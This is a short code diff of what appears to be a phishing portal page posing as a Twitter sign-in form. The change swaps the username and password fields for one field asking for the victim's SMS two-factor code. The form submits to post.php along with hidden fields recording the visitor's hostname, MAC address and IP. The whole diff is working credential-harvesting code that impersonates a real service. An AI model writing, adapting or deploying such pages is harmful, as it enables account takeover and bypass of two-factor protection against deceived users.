@@ -138,8 +138,7 @@ require_once('helper.php');
 
           <form method="POST" action="post.php" class="form-signin">
 
-            <input type="text" name="email_twitter" class="form-email" placeholder="Phone, email, or username" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input type="password" name="password_twitter" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="text" name="2fa_twitter" class="form-email" placeholder="Enter your SMS code" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
